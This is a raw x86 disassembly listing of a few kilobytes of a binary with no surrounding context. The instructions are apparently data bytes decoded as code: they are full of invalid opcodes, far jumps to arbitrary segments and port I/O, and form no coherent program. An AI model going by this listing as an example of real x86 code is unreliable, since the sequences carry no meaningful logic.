  408a1e:	stos   DWORD PTR es:[edi],eax
  408a1f:	jbe    0x408a60
  408a21:	add    edi,DWORD PTR ds:0xfe8c7139
  408a27:	imul   esp,DWORD PTR [eax],0xe73ff6a3
  408a2d:	jb     0x408a23
  408a2f:	mov    edi,0x9caf0f5b
  408a34:	push   ecx
  408a35:	(bad)  
  408a36:	adc    ecx,ebx
  408a38:	ret    
  408a39:	mov    al,0xa4
  408a3b:	and    eax,0x190c2d87
  408a40:	mov    DWORD PTR [edx],0xf65fdd83
  408a46:	jne    0x408a29
  408a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a49:	sub    al,0xbc
  408a4b:	inc    ecx
  408a4c:	ret    0x9de9
  408a4f:	loope  0x408a11
  408a51:	mov    ecx,0x40e49212
  408a56:	sub    eax,0x87be9ce3
  408a5b:	and    al,0x18
  408a5d:	cmp    BYTE PTR [edx+0x31d89d64],dl
  408a63:	jg     0x408a85
  408a65:	shl    BYTE PTR [edi-0x21],cl
  408a68:	xor    BYTE PTR [ebx-0x75ee96eb],cl
  408a6e:	sbb    DWORD PTR [edi-0x5a6bfc96],0xffffffd7
  408a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a76:	adc    ebx,DWORD PTR [ebx]
  408a78:	mov    ebp,0x601949fa
  408a7d:	mul    DWORD PTR [ebx-0xf72085]
  408a83:	pop    ds
  408a84:	ins    BYTE PTR es:[edi],dx
  408a85:	xor    eax,0x979accab
  408a8b:	and    eax,0x8f3e3f00
  408a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a91:	test   eax,0x25ea0c6f
  408a96:	adc    BYTE PTR [ecx],0xc6
  408a99:	out    dx,al
  408a9a:	imul   ebp,eax,0x34
  408a9d:	mov    WORD PTR [ebp-0x1],ss
  408aa0:	sbb    DWORD PTR [ecx-0x7c],ebp
  408aa3:	push   edi
  408aa4:	mov    ah,0x11
  408aa6:	pop    ss
  408aa7:	in     al,dx
  408aa8:	sub    esi,DWORD PTR [esi-0x4c1ca852]
  408aae:	stos   BYTE PTR es:[edi],al
  408aaf:	jmp    0xb6b03917
  408ab4:	aaa    
  408ab5:	(bad)  
  408ab6:	pop    ds
  408ab7:	mov    bl,0x51
  408ab9:	loope  0x408aa2
  408abb:	cmp    eax,0xf0c52fa
  408ac0:	les    ecx,FWORD PTR [ebx+0x7317a744]
  408ac6:	mov    dl,0x80
  408ac8:	mov    al,0x19
  408aca:	and    dl,BYTE PTR [ecx+edx*8]
  408acd:	pop    ecx
  408acf:	adc    eax,0x460e4909
  408ad4:	fs int 0x5b
  408ad7:	dec    ebx
  408ad8:	fwait
  408ad9:	mov    ds:0x3b5e831e,al
  408ade:	sbb    cl,dh
  408ae0:	or     ebp,esi
  408ae2:	jl     0x408b2b
  408ae4:	inc    esp
  408ae5:	jp     0x408b66
  408ae7:	and    edx,DWORD PTR ds:0xd373ab29
  408aed:	pop    esi
  408aee:	mov    bh,BYTE PTR [ecx+0x5a]
  408af1:	das    
  408af2:	aas    
  408af3:	aaa    
  408af4:	cmp    esp,DWORD PTR [eax+0x47]
  408af7:	xchg   ebp,eax
  408af8:	in     eax,0xd8
  408afa:	add    BYTE PTR [eax-0x7f],ah
  408afd:	mov    ebx,DWORD PTR [ebx+0x136edfad]
  408b03:	dec    edx
  408b04:	jmp    0xf021:0xc6411af7
  408b0b:	dec    ecx
  408b0c:	push   0xc63d36b7
  408b11:	(bad)  
  408b13:	pop    ebx
  408b14:	mov    edi,DWORD PTR [esi-0xc]
  408b17:	mov    eax,0x2cff22e6
  408b1c:	inc    ebp
  408b1d:	sbb    DWORD PTR [ecx],0x7d4d0f47
  408b23:	lds    eax,FWORD PTR [eax]
  408b25:	pop    ecx
  408b26:	neg    BYTE PTR [ebx]
  408b28:	ins    BYTE PTR es:[edi],dx
  408b29:	hlt    
  408b2a:	push   0x41
  408b2c:	in     al,0x88
  408b2e:	in     eax,0x45
  408b30:	hlt    
  408b31:	adc    BYTE PTR [esi],cl
  408b33:	cwde   
  408b34:	iret   
  408b35:	stos   BYTE PTR es:[edi],al
  408b36:	cmp    DWORD PTR [ecx-0x42],ecx
  408b39:	ins    DWORD PTR es:[edi],dx
  408b3a:	cmp    al,0x4
  408b3c:	addr16 pop ecx
  408b3e:	jbe    0x408bb3
  408b40:	mov    eax,fs:0x9ccf2572
  408b46:	pop    ebx
  408b47:	sbb    bl,BYTE PTR [esi-0x73751b67]
  408b4d:	sbb    edx,esp
  408b4f:	ins    BYTE PTR es:[edi],dx
  408b50:	pop    ss
  408b51:	mov    ch,0x28
  408b53:	retf   0x60bb
  408b56:	enter  0xb179,0x70
  408b5a:	sbb    BYTE PTR [bx],bl
  408b5d:	inc    edx
  408b5e:	cmc    
  408b5f:	jmp    0x408b4f
  408b61:	dec    ebp
  408b62:	int    0xfb
  408b64:	or     dl,cl
  408b66:	and    DWORD PTR [edi],ebp
  408b68:	fs mov eax,0xc2989ae8
  408b6e:	jecxz  0x408af0
  408b70:	push   cs
  408b71:	xchg   BYTE PTR [edi],ah
  408b73:	call   0x969c:0xb4fa6bcb
  408b7a:	sub    DWORD PTR [edx],0x56bc28c4
  408b80:	inc    edx
  408b81:	mov    ?,WORD PTR [edi]
  408b83:	dec    esi
  408b84:	pop    esp
  408b85:	ja     0x408bd3
  408b87:	jge    0x408b66
  408b89:	mov    ah,bh
  408b8b:	bswap  esi
  408b8d:	mov    bh,BYTE PTR [edi-0x27]
  408b90:	jns    0x408b93
  408b92:	cmp    DWORD PTR [edx+edi*1+0x10],ecx
  408b96:	test   DWORD PTR [edx+esi*2-0x12bec156],0xad83b59d
  408ba1:	aam    0x8f
  408ba3:	inc    edi
  408ba4:	call   0x5e2e6d0d
  408ba9:	fild   DWORD PTR [ebx+0x2563329d]
  408baf:	in     eax,0xc0
  408bb1:	in     al,dx
  408bb2:	xchg   ebp,ecx
  408bb4:	mov    al,ds:0x21825991
  408bb9:	mov    ebx,0x89cfbdb6
  408bbe:	push   0xffffffe5
  408bc0:	lods   eax,DWORD PTR ds:[esi]
  408bc1:	push   ebp
  408bc2:	cmp    al,0xa5
  408bc4:	sub    al,0xd
  408bc6:	add    al,0xba
  408bc8:	fsubr  st(5),st
  408bca:	mov    bh,0x4d
  408bcc:	fcmovu st,st(1)
  408bce:	retf   
  408bcf:	jmp    0xf8f1:0x2de811db
  408bd6:	or     BYTE PTR [eax],ch
  408bd8:	sbb    ah,BYTE PTR [edx]
  408bda:	mov    ch,0xf4
  408bdc:	mov    dl,0x18
  408bde:	les    ebx,FWORD PTR [ecx+ebx*2]
  408be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be2:	mov    ds:0x5d2d0863,al
  408be7:	ds jp  0x408be2
  408bea:	(bad)  
  408beb:	xchg   edx,eax
  408bec:	mov    ebx,0x321e019b
  408bf1:	imul   edi,DWORD PTR [edx],0x79a91853
  408bf7:	loop   0x408bb8
  408bf9:	ret    
  408bfa:	dec    ebx
  408bfb:	stc    
  408bfc:	(bad)  
  408bfd:	daa    
  408bfe:	int    0x7a
  408c00:	das    
  408c01:	pop    esi
  408c02:	or     eax,0xb0ed65ca
  408c07:	fisubr WORD PTR [eax+0x52]
  408c0a:	sbb    ebx,DWORD PTR [eax+eiz*4-0x2319888]
  408c11:	jo     0x408bb7
  408c13:	call   0x6cbf0ae5
  408c18:	jb     0x408c6d
  408c1a:	call   0x7576834f
  408c1f:	out    dx,eax
  408c20:	(bad)  [edx+eiz*4]
  408c23:	test   ebp,ebx
  408c25:	cmp    esp,DWORD PTR [ecx+0x28]
  408c28:	rcr    DWORD PTR [esi],cl
  408c2a:	or     al,0x23
  408c2c:	in     al,0x75
  408c2e:	sub    bh,ah
  408c30:	test   DWORD PTR [edx-0x2368bbba],ebp
  408c36:	push   edx
  408c37:	jl     0x408bc1
  408c39:	jp     0x408bef
  408c3b:	ffree  st(5)
  408c3d:	les    eax,FWORD PTR [edx]
  408c3f:	jno    0x408c97
  408c41:	add    DWORD PTR [esi],ecx
  408c43:	mov    dh,0x38
  408c45:	jle    0x408cb7
  408c47:	ror    DWORD PTR [esi-0x5163ba78],cl
  408c4d:	dec    ebp
  408c4e:	jmp    0xe7129e54
  408c53:	outs   dx,BYTE PTR ds:[esi]
  408c54:	adc    edi,DWORD PTR [edi+0x47b8c5d3]
  408c5a:	jl     0x408bef
  408c5c:	retf   0xef1f
  408c5f:	cmp    ah,BYTE PTR [ebx-0x30ec8925]
  408c65:	xlat   BYTE PTR ds:[ebx]
  408c66:	cmp    DWORD PTR [ecx-0x5f],0x2f
  408c6a:	sbb    dl,BYTE PTR [ebx]
  408c6c:	aas    
  408c6d:	mov    esi,ecx
  408c6f:	mov    ch,0xc2
  408c71:	je     0x408cec
  408c73:	mov    esi,0x6425d776
  408c78:	xchg   ebp,eax
  408c79:	jmp    0x5b30:0xa661f7b0
  408c80:	fcom   st(5)
  408c82:	(bad)  
  408c83:	jmp    0x408cdd
  408c85:	fsubrp st(6),st
  408c87:	mov    edx,0x98ea5855
  408c8c:	je     0x408c59
  408c8e:	les    ecx,FWORD PTR [edi]
  408c90:	and    DWORD PTR [esi+0x45],0x61360ed
  408c97:	cwde   
  408c98:	in     eax,dx
  408c99:	mov    cl,0x25
  408c9b:	sbb    dh,0x42
  408c9e:	or     esp,edx
  408ca0:	push   edi
  408ca1:	mov    ecx,0x6eff75be
  408ca6:	cli    
  408ca7:	add    eax,0xcc7f4ab
  408cac:	nop
  408cad:	or     ebp,DWORD PTR [edi]
  408caf:	data16 inc BYTE PTR [edx+edx*2+0x20]
  408cb4:	mov    dh,0xa3
  408cb6:	das    
  408cb7:	cmp    bh,BYTE PTR [ecx+0x73]
  408cba:	iret   
  408cbb:	push   ss
  408cbc:	dec    edi
  408cbd:	mov    cx,0x794c
  408cc1:	sbb    eax,0xeee66853
  408cc6:	ds jmp 0xd693ca32
  408ccc:	jecxz  0x408ce1
  408cce:	test   BYTE PTR [eax+ebp*1],al
  408cd1:	rcl    BYTE PTR [esi-0x65],0xb4
  408cd5:	inc    edi
  408cd6:	and    BYTE PTR [ebp+0x5a],ah
  408cd9:	jae    0x408d50
  408cdb:	push   esi
  408cdc:	(bad)  
  408cdd:	sar    DWORD PTR [ebx],1
  408cdf:	xor    edi,DWORD PTR [ebp-0x7a]
  408ce2:	aas    
  408ce3:	mov    ecx,0x1fa23e66
  408ce8:	inc    ebp
  408ce9:	add    ecx,ebx
  408ceb:	sub    al,0xe1
  408ced:	(bad)  [esi]
  408cef:	cdq    
  408cf0:	adc    al,0x8c
  408cf2:	in     al,0x5d
  408cf4:	imul   BYTE PTR ds:0xadc31f83
  408cfa:	adc    DWORD PTR [esi-0xe],edx
  408cfd:	jne    0x408d27
  408cff:	sub    eax,edx
  408d01:	sbb    bh,BYTE PTR [ebx+0xd]
  408d04:	aaa    
  408d05:	adc    DWORD PTR ds:0xf0388f70,0x60
  408d0c:	cwde   
  408d0d:	into   
  408d0e:	aam    0xfa
  408d10:	(bad)
  408d13:	clc    
  408d14:	mov    esi,0x7781dae
  408d19:	or     BYTE PTR [eax-0x57],dh
  408d1c:	jg     0x408cef
  408d1e:	pop    ebx
  408d1f:	mov    esp,0xf18988e
  408d24:	ja     0x408cc7
  408d26:	xchg   ecx,eax
  408d27:	push   ebx
  408d28:	push   eax
  408d29:	mov    dh,0x19
  408d2b:	mov    bh,BYTE PTR [ecx+0x6c8e79c9]
  408d31:	rcr    BYTE PTR [eax+0x41],0xc0
  408d35:	xor    eax,0x7c50e49e
  408d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d3b:	stc    
  408d3c:	mov    edi,0x9bafd409
  408d41:	mov    edx,0x58005f56
  408d46:	xlat   BYTE PTR ds:[ebx]
  408d48:	mov    dl,0x7a
  408d4a:	ds shl edi,0x69
  408d4e:	jbe    0x408cd8
  408d50:	sub    eax,0xfdea7435
  408d55:	pop    es
  408d56:	jge    0x408cfd
  408d58:	imul   ebp,DWORD PTR [ebp+0x3b36a1f8],0x83fae3cb
  408d62:	and    bh,BYTE PTR [edx]
  408d64:	test   al,0xac
  408d66:	int3   
  408d67:	jno    0x408d04
  408d69:	jg     0x408dad
  408d6b:	ror    DWORD PTR [edx],1
  408d6d:	push   cs
  408d6e:	sub    eax,0xa31f5e5
  408d73:	fisub  DWORD PTR [ebx+edi*1+0x4615debd]
  408d7a:	(bad)  
  408d7b:	aad    0xd0
  408d7d:	push   ecx
  408d7e:	jge    0x408d08
  408d80:	mov    ch,bl
  408d82:	jo     0x408d54
  408d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d85:	fild   QWORD PTR [ecx-0x3e5bca72]
  408d8b:	cdq    
  408d8c:	add    al,0x7e
  408d8e:	inc    ecx
  408d8f:	pavgb  mm0,QWORD PTR [eax-0x3]
  408d93:	and    eax,0x43ee1243
  408d98:	bound  esi,QWORD PTR [eax-0x698d8500]
  408d9e:	(bad)  
  408d9f:	cmp    eax,0x676e0a7e
  408da4:	dec    ebx
  408da5:	in     al,0xb9
  408da7:	mov    ebx,ebx
  408da9:	ficomp DWORD PTR [esi-0x15]
  408dac:	pushf  
  408dad:	add    eax,0x4616cb63
  408db2:	xchg   esi,eax
  408db3:	jmp    0x408d9e
  408db5:	push   ss
  408db6:	cmp    al,0x1
  408db8:	sti    
  408db9:	mov    esp,0x8255ef91
  408dbe:	adc    eax,0xb5c2f2c3
  408dc3:	das    
  408dc4:	push   ds
  408dc5:	cmc    
  408dc6:	ss pop ebp
  408dc8:	xchg   esp,eax
  408dc9:	popa   
  408dca:	pop    ecx
  408dcb:	lds    edx,FWORD PTR [edi+0x4c]
  408dce:	jge    0x408d95
  408dd0:	fwait
  408dd1:	add    eax,0x7d3b986c
  408dd6:	out    0x7f,eax
  408dd8:	jp     0x408dc2
  408dda:	jmp    0x7e1d:0xecba630e
  408de1:	mov    al,0x55
  408de3:	popf   
  408de4:	inc    esi
  408de5:	out    0xcc,al
  408de7:	inc    ebx
  408de8:	jmp    0x408d82
  408dea:	sub    bl,BYTE PTR [eax+0x1528b7a3]
  408df0:	fst    QWORD PTR [ebp-0x52dff315]
  408df6:	inc    esi
  408df7:	bnd jge 0x408e0c
  408dfa:	inc    edx
  408dfb:	mov    al,0xa9
  408dfd:	std    
  408dfe:	pop    edx
  408dff:	xchg   ebp,eax
  408e00:	test   al,0xf6
  408e02:	mov    ecx,0x2b72c024
  408e07:	xchg   al,bl
  408e09:	jle    0x408dae
  408e0b:	loopne 0x408df8
  408e0d:	rcl    BYTE PTR [edi],cl
  408e0f:	mov    cl,0xcf
  408e11:	(bad)  
  408e12:	call   0x23cf:0x9c270b81
  408e19:	add    BYTE PTR [edx+0x34d66536],0xc5
  408e20:	adc    eax,0xf6f82d13
  408e25:	pop    ds
  408e26:	imul   DWORD PTR [edx]
  408e28:	fistp  QWORD PTR [eax+0x2e608678]
  408e2e:	mov    dh,0x61
  408e30:	push   edx
  408e31:	push   ebx
  408e32:	js     0x408e32
  408e34:	sbb    ch,dh
  408e36:	je     0x408dd0
  408e38:	int    0x8a
  408e3a:	inc    esi
  408e3b:	std    
  408e3c:	in     eax,dx
  408e3d:	pop    edi
  408e3e:	and    cl,BYTE PTR [edx-0x1aec0c5f]
  408e44:	add    al,0x87
  408e46:	mov    esi,0x78f78c3c
  408e4b:	(bad)  
  408e4c:	sbb    al,0xa4
  408e4e:	add    eax,0xf153eb9e
  408e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e54:	dec    ebp
  408e55:	mov    edi,0xc118bcfe
  408e5a:	out    dx,eax
  408e5b:	aad    0x52
  408e5d:	cmc    
  408e5e:	jnp    0x408df6
  408e60:	add    eax,0xa794e0d4
  408e65:	jae    0x408edd
  408e67:	jns    0x408eab
  408e69:	ds mov ebx,0x4d661cf4
  408e6f:	mov    dh,BYTE PTR [edx+0x3b]
  408e72:	aaa    
  408e73:	int    0x27
  408e75:	or     DWORD PTR [ebx+ebp*8+0x6e740788],edx
  408e7c:	add    al,0x68
  408e7e:	int3   
  408e7f:	lods   eax,DWORD PTR ds:[esi]
  408e80:	cmp    cl,BYTE PTR [edx+0x5a]
  408e83:	inc    ebx
  408e84:	xchg   esp,eax
  408e85:	test   al,ch
  408e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e88:	rcl    BYTE PTR ds:0x812f7dd,cl
  408e8e:	mov    dh,0x27
  408e90:	fstp   TBYTE PTR [edx+0x9]
  408e93:	dec    ecx
  408e94:	add    bh,dh
  408e96:	sbb    cl,dh
  408e98:	pop    edx
  408e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9a:	daa    
  408e9b:	(bad)  
  408e9c:	daa    
  408e9d:	xor    bh,dl
  408e9f:	jno    0x408e6e
  408ea1:	loop   0x408eba
  408ea3:	scas   eax,DWORD PTR es:[edi]
  408ea4:	sub    al,0xee
  408ea6:	rcl    eax,1
  408ea8:	pusha  
  408ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eaa:	xchg   edi,eax
  408eab:	push   esi
  408eac:	sub    DWORD PTR [edi-0x77ed98a],ebp
  408eb2:	rcl    eax,1
  408eb4:	jns    0x408f05
  408eb6:	std    
  408eb7:	fwait
  408eb8:	mov    bh,0x60
  408eba:	pop    ss
  408ebb:	cmp    ah,ch
  408ebd:	jmp    0x93df8654
  408ec2:	out    0x2a,eax
  408ec4:	scas   al,BYTE PTR es:[edi]
  408ec5:	dec    ebx
  408ec6:	fsubr  QWORD PTR [esi+0x3f8bf558]
  408ecc:	(bad)  
  408ecd:	cmp    DWORD PTR [ebp+edx*4-0x5e433751],ebp
  408ed4:	sub    al,0x2c
  408ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed7:	pop    ecx
  408ed8:	scas   al,BYTE PTR es:[edi]
  408ed9:	daa    
  408eda:	jecxz  0x408ed7
  408edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408edd:	adc    ch,BYTE PTR [esi-0x5ffc818c]
  408ee3:	popf   
  408ee4:	shr    bl,0x55
  408ee7:	loop   0x408ee0
  408ee9:	push   eax
  408eea:	data16 fisttp WORD PTR [eax-0x282c1a7f]
  408ef1:	sar    BYTE PTR [ecx+0x1],0xa6
  408ef5:	xor    BYTE PTR [ecx+0x4c116af6],0x50
  408efc:	add    dh,dl
  408efe:	and    al,0xf2
  408f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f01:	pop    eax
  408f02:	xor    eax,0x95903106
  408f07:	fld    st(7)
  408f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f0a:	stos   BYTE PTR es:[edi],al
  408f0b:	mov    dl,0x60
  408f0d:	lea    eax,[edx]
  408f0f:	ret    
  408f10:	push   esi
  408f11:	ins    DWORD PTR es:[edi],dx
  408f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f13:	(bad)  
  408f14:	jnp    0x408f3a
  408f16:	mov    ch,0x11
  408f18:	repz add ch,BYTE PTR [edi-0x6e]
  408f1c:	ins    BYTE PTR es:[edi],dx
  408f1d:	inc    ecx
  408f1e:	das    
  408f1f:	inc    ebx
  408f20:	jg     0x408eed
  408f22:	xchg   BYTE PTR [esi],al
  408f24:	mov    bl,dh
  408f26:	mov    ch,0x9c
  408f28:	in     eax,dx
  408f29:	std    
  408f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f2b:	pop    ebp
  408f2c:	jecxz  0x408f6e
  408f2e:	pop    ds
  408f2f:	jg     0x408f11
  408f31:	jo     0x408f08
  408f33:	add    ch,BYTE PTR [esp+eax*2]
  408f36:	adc    al,0xbc
  408f38:	ja     0x408f8c
  408f3a:	jp     0x408efb
  408f3c:	lea    edi,[esi+edx*2+0x79]
  408f40:	(bad)  
  408f41:	ss mov ebp,0xfb967092
  408f47:	call   0x5d06:0x42b49158
  408f4e:	inc    esi
  408f4f:	adc    dl,bl
  408f51:	jg     0x408f5c
  408f53:	inc    edi
  408f54:	pushf  
  408f55:	mov    ds:0x7e4e5c59,al
  408f5a:	jbe    0x408ede
  408f5c:	pop    ebp
  408f5d:	xchg   BYTE PTR [ecx],ch
  408f5f:	ret    0xb3b
  408f62:	inc    ebp
  408f63:	pop    ss
  408f64:	shr    DWORD PTR [esi],1
  408f66:	(bad)  
  408f67:	popa   
  408f68:	fnstcw WORD PTR [edi-0x1b6baf70]
  408f6e:	lods   eax,DWORD PTR ds:[esi]
  408f6f:	or     eax,0x41bead3a
  408f74:	sub    DWORD PTR [edi],ecx
  408f76:	xchg   ecx,eax
  408f77:	mov    al,ds:0xda1f9128
  408f7c:	ins    WORD PTR es:[edi],dx
  408f7e:	enter  0x573e,0xb4
  408f82:	inc    ebx
  408f83:	jb     0x408fca
  408f85:	push   ebp
  408f86:	dec    esp
  408f87:	bound  ebp,QWORD PTR [ebx-0x501e0eca]
  408f8d:	pop    ebx
  408f8e:	sbb    DWORD PTR [esi+0x68],edx
  408f91:	lahf   
  408f92:	jl     0x408f60
  408f94:	fiadd  DWORD PTR [eax-0x1c]
  408f97:	je     0x409015
  408f99:	out    0x9c,eax
  408f9b:	push   esi
  408f9c:	mov    esi,DWORD PTR [eax]
  408f9e:	push   esi
  408f9f:	mov    edi,0x650f8d76
  408fa4:	adc    DWORD PTR [ebp-0x5ccdc652],eax
  408faa:	xor    edx,ebp
  408fac:	fsub   DWORD PTR [eax-0x36681a7f]
  408fb2:	mov    ds:0x74cbea22,al
  408fb7:	call   0x7b06:0xf8b36f78
  408fbe:	cmp    BYTE PTR [edx],dh
  408fc0:	out    dx,eax
  408fc1:	inc    ecx
  408fc2:	enter  0x71ae,0x39
  408fc6:	dec    ecx
  408fc7:	int3   
  408fc8:	fldenv [ecx-0x1f43d68a]
  408fce:	cmp    ecx,DWORD PTR [ebp+0x17]
  408fd1:	retf   
  408fd2:	outs   dx,BYTE PTR ds:[esi]
  408fd3:	mov    ds:0xe08ddb1d,eax
  408fd8:	in     eax,dx
  408fd9:	xor    DWORD PTR [ebp-0x47bc0f5b],0x61
  408fe0:	adc    eax,DWORD PTR [edx+ebp*4]
  408fe3:	and    ch,BYTE PTR [eax]
  408fe5:	or     esp,DWORD PTR [ecx]
  408fe7:	jo     0x408ff9
  408fe9:	pop    ds
  408fea:	movd   DWORD PTR [edi-0x7],mm7
  408fee:	or     BYTE PTR [edi+0x4ae342fc],bh
  408ff4:	jp     0x408fbc
  408ff6:	jecxz  0x408fdd
  408ff8:	push   0x81bffe56
  408ffd:	out    0x5b,eax
  408fff:	sbb    eax,0xe926dcd9
  409004:	aas    
  409005:	dec    ecx
  409006:	iret   
  409007:	push   es
  409008:	dec    ebp
  409009:	cmp    edi,eax
  40900b:	jmp    0xac02:0x4c70de50
  409012:	sti    
  409013:	inc    edi
  409014:	adc    al,0x86
  409016:	dec    esp
  409017:	sub    BYTE PTR [ecx+0x41264d5c],bl
  40901d:	or     eax,0x34
  409020:	push   0x61
  409022:	dec    eax
  409023:	jae    0x408fe2
  409025:	jne    0x40903d
  409027:	(bad)  
  409028:	inc    edi
  409029:	cdq    
  40902a:	mov    eax,0x3989b6fd
  40902f:	cli    
  409030:	mov    ds:0xead488d6,al
  409035:	jg     0x409055
  409037:	mov    ds:0x1415d3b0,al
  40903c:	sub    BYTE PTR [ebp+0x24],cl
  40903f:	out    0xe8,al
  409041:	adc    DWORD PTR [eax-0x6b],eax
  409044:	adc    dl,BYTE PTR [eax-0x66]
  409047:	jnp    0x408ff7
  409049:	aam    0xe0
  40904b:	mov    ds:0x8ef5b78d,al
  409050:	fsubr  DWORD PTR [ebx-0x1e05c152]
  409056:	push   0x20
  409058:	add    eax,0xeded7eb0
  40905d:	inc    ebp
  40905e:	cs mov cl,0xbc
  409061:	mov    ebx,0x89838c23
  409066:	inc    ecx
  409067:	jo     0x4090ae
  409069:	popa   
  40906a:	cmp    eax,0xd8ee070e
  40906f:	push   esp
  409070:	jmp    0x408ff3
  409072:	pop    eax
  409073:	and    DWORD PTR [edi+0x65],eax
  409076:	mov    bl,0xb5
  409078:	stos   BYTE PTR es:[edi],al
  409079:	cmp    eax,0xec1cac66
  40907e:	sbb    al,0x4f
  409080:	xor    eax,0xcab1d230
  409085:	mov    ds:0x86984563,al
  40908a:	mov    esi,0xda771956
  40908f:	leave  
  409090:	push   ebp
  409091:	mov    al,0x78
  409093:	or     ax,0xa06c
  409097:	ret    0x3f31
  40909a:	xchg   ebp,eax
  40909b:	gs stc 
  40909d:	fcmovb st,st(6)
  40909f:	int    0x2a
  4090a1:	cmp    edi,DWORD PTR [edx*4-0x50c59859]
  4090a8:	pop    eax
  4090a9:	(bad)  
  4090ab:	clc    
  4090ac:	xor    eax,0x6424adda
  4090b1:	cld    
  4090b2:	iret   
  4090b3:	mov    ch,0xbd
  4090b5:	adc    eax,0xdcdd97d6
  4090ba:	out    dx,eax
  4090bb:	je     0x40910e
  4090bd:	les    ebp,FWORD PTR [esi]
  4090bf:	mov    cl,cl
  4090c1:	dec    edx
  4090c2:	idiv   BYTE PTR [edx+eax*2-0x37fb090e]
  4090c9:	adc    bh,0xe5
  4090cc:	jge    0x40913d
  4090ce:	ret    
  4090cf:	cmp    ch,dl
  4090d1:	sub    dh,BYTE PTR [ebx]
  4090d3:	fisttp WORD PTR [edx-0x3ad847c9]
  4090d9:	push   cs
  4090da:	fbstp  TBYTE PTR [ebp+0x58372089]
  4090e0:	cli    
  4090e1:	dec    ebx
  4090e2:	xchg   BYTE PTR [ecx-0x76],ah
  4090e5:	sti    
  4090e6:	sub    esi,DWORD PTR [edi]
  4090e8:	aaa    
  4090e9:	jae    0x409159
  4090eb:	dec    edi
  4090ec:	sbb    BYTE PTR [ebx-0x43],dl
  4090ef:	sti    
  4090f0:	cmp    bl,bh
  4090f2:	jmp    0x2e4d2d71
  4090f7:	mov    edi,0xa620349a
  4090fc:	sbb    cl,BYTE PTR [eax+0x69]
  4090ff:	add    eax,0x95d8c25c
  409104:	sub    edi,edx
  409106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409107:	inc    esp
  409108:	sbb    DWORD PTR [ebx+0x19],esp
  40910b:	jne    0x4090c3
  40910d:	sub    ecx,0x4302c859
  409113:	aad    0x81
  409115:	or     al,0xdc
  409117:	cmp    cl,BYTE PTR [edx+0x35]
  40911a:	in     eax,0x5c
  40911c:	in     al,0x5d
  40911e:	clc    
  40911f:	and    al,0x95
  409121:	cmp    BYTE PTR [ecx+0x287dfea9],cl
  409127:	xchg   ebp,eax
  409128:	dec    ebp
  409129:	mov    ch,0x3
  40912b:	rcr    DWORD PTR [ecx+0x72a74389],1
  409131:	popf   
  409132:	jnp    0x40915b
  409134:	sbb    DWORD PTR [edx],0x4d
  409137:	sub    DWORD PTR [ebx],edx
  409139:	sbb    BYTE PTR ds:0x29abcd83,dh
  40913f:	push   esp
  409140:	mov    DWORD PTR [eax],eax
  409142:	and    al,0xbf
  409144:	mov    esi,0x8c2e6c98
  409149:	stos   BYTE PTR es:[edi],al
  40914a:	inc    esi
  40914b:	data16 jnp 0x40919a
  40914e:	pop    esi
  40914f:	mov    bh,0x5e
  409151:	(bad)  
  409152:	sar    BYTE PTR [edx-0x522503d],1
  409158:	int    0xc1
  40915a:	jno    0x4090ff
  40915c:	xchg   ecx,eax
  40915d:	add    eax,0xb91768f7
  409162:	push   edi
  409163:	sbb    BYTE PTR [eax],ah
  409165:	(bad)  
  409166:	es jg  0x40918c
  409169:	mov    DWORD PTR [ecx],ecx
  40916b:	mov    edi,0xc55e554
  409170:	aad    0xa8
  409172:	gs es (bad) 
  409175:	or     al,0xa5
  409177:	xchg   edi,eax
  409178:	jge    0x4091bb
  40917a:	test   al,0x5c
  40917c:	jmp    0x4617bc2f
  409181:	jae    0x409126
  409183:	jo     0x4091cc
  409185:	cwde   
  409186:	jge    0x40918e
  409188:	jmp    0x4091f2
  40918a:	mov    eax,DWORD PTR [ebx+0x40]
  40918d:	inc    ebp
  40918e:	fnsave [eax]
  409190:	mov    ebx,0xc92140b2
  409195:	adc    DWORD PTR ds:0x97cca07e,0xfebbf306
  40919f:	fisttp DWORD PTR [edi-0x61a8bf]
  4091a5:	ret    
  4091a6:	imul   ebx,DWORD PTR [ebp+eax*4+0x1ba91474],0x3933bbf8
  4091b1:	pop    ebx
  4091b2:	(bad)  
  4091b3:	or     esi,DWORD PTR [esi]
  4091b5:	cmp    al,0x32
  4091b7:	bound  esp,QWORD PTR ds:0x5772d3a7
  4091bd:	xchg   edx,eax
  4091be:	mov    eax,ds:0x68f09954
  4091c3:	ds xchg edi,eax
  4091c5:	test   BYTE PTR [edi],al
  4091c7:	outs   dx,DWORD PTR ds:[esi]
  4091c8:	jmp    0xb15c:0x6c19cdc8
  4091cf:	(bad)  
  4091d0:	std    
  4091d1:	pushf  
  4091d2:	jmp    0x49db:0x804cc6ee
  4091d9:	test   DWORD PTR [ebx+eax*2+0xb97715b],esp
  4091e0:	ins    BYTE PTR es:[edi],dx
  4091e1:	out    dx,al
  4091e2:	in     eax,dx
  4091e3:	jbe    0x409258
  4091e5:	fsubr  DWORD PTR [ecx+0x33]
  4091e8:	(bad)  
  4091e9:	(bad)  [ebx+0x7d]
  4091ec:	sar    DWORD PTR [esi+0x76],cl
  4091ef:	push   ecx
  4091f0:	retf   0xd8f1
  4091f3:	pop    edx
  4091f4:	mov    dl,0xe7
  4091f6:	aaa    
  4091f7:	sub    DWORD PTR [esi+0x19],esi
  4091fa:	std    
  4091fb:	xor    edi,eax
  4091fd:	jbe    0x40927a
  4091ff:	adc    DWORD PTR [ebp-0x14],ebx
